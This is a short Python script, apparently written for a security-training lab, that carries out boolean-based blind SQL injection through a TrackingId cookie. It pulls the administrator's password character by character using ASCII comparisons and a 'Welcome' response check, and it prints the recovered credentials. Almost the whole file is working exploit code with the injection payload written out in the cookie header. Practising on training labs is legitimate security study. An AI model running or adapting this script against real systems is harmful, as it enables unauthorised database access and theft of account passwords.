import urllib3


def petition(cond, num):
    req = http.request('GET',
                       f'{url}',
                       headers={
                           "Cookie": f"TrackingId=gJDalV242Z8NhjUN' AND ASCII(SUBSTRING(({query}),{i},1)){cond}{num}-- -; session=NwYpZJ3dFnKUYrZeXtJQ54LZxqGM8f8i"})
    if welcome in req.data:
        return True


def validate_cond():
    if if_symbol():
        return if_symbol()
    if if_number():
        return if_number()
    if if_mayus():
        return if_mayus()
    if if_low():
        return if_low()


def if_symbol():
    if petition('<=', '47'):
        codes = [x for x in range(32, 48)]
        for j in codes:
            if petition('=', j) == True:
                return j
    else:
        return False


def if_number():
    if petition('<=', '64'):
        codes = [x for x in range(48, 65)]
        for j in codes:
            if petition('=', j) == True:
                return j
    else:
        return False


def if_mayus():
    if petition('<=', '96'):
        codes = [x for x in range(65, 97)]
        for j in codes:
            if petition('=', j) == True:
                return j
    else:
        return False


def if_low():
    if petition('<=', '126'):
        codes = [x for x in range(97, 127)]
        for j in codes:
            if petition('=', j) == True:
                return j
    else:
        return False


welcome = bytes('Welcome', 'utf-8')
url = 'https://0aa600b40350a0fcc00981f300960044.web-security-academy.net/filter?category=Accessories'
query = "SELECT password FROM users WHERE username='administrator'"
database_name = "current_database()"
chars = []
string = ""

http = urllib3.PoolManager()

for i in range(1, 21):
    print("Caracter:", i)
    chars.insert(0, validate_cond())

    if len(chars) != 0:
        string += chr(chars.pop())
        print("\nUpdate:")
        print(f"\tadministrator ~ {string}\n")

    if i == 20:
        print(
            f"\n Finish, the credentials are: \n\tadministrator ~ {string}\n")


# req = http.request('GET',
#                    f'{url}',
#                    headers={
#                        "Cookie": "TrackingId=6G92ewuI46sL5LKl' AND 1=1-- -; session=v8fB29gsPWhwjHyvAA6KuQbqYn1dWf9E"})
# if welcome in req.data:
#     print("Good")
